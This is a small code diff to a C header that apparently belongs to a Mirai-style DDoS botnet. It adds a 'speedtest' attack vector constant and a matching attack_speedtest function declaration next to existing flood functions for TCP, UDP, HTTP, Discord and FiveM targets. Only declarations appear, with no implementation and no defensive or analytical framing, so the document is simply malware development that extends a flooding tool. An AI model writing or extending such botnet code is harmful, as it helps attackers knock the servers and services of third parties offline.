@@ -61,6 +61,9 @@ struct Attack {
 // HTTP vector
 #define ATK_VEC_HTTP        11
 
+//speedtest vector
+#define ATK_VEC_SPEEDTEST   12
+
 
 //FLAGS
 
@@ -191,6 +194,7 @@ void attack_tcp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_o
 void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_discord(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_fivem(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_speedtest(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
 void update_process(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
